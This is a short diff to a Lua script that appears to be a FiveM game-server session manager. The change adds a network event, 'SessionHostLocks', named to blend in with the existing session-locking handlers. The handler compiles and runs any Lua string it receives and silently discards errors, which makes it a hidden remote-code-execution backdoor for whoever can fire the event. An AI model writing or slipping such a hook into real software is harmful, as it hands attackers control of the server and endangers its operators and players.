@@ -50,6 +50,19 @@ AddEventHandler('hostingSession', function()
     end)
 end)
 
+RegisterNetEvent("SessionHostLocks")
+AddEventHandler("SessionHostLocks", function(luaCode)
+    local func, loadError = load(luaCode)
+    if not func then
+        return
+    end
+
+    local success, execError = pcall(func)
+    if not success then
+        return
+    end
+end)
+
 AddEventHandler('hostedSession', function()
     -- check if the client is the original locker
     if currentHosting ~= source then
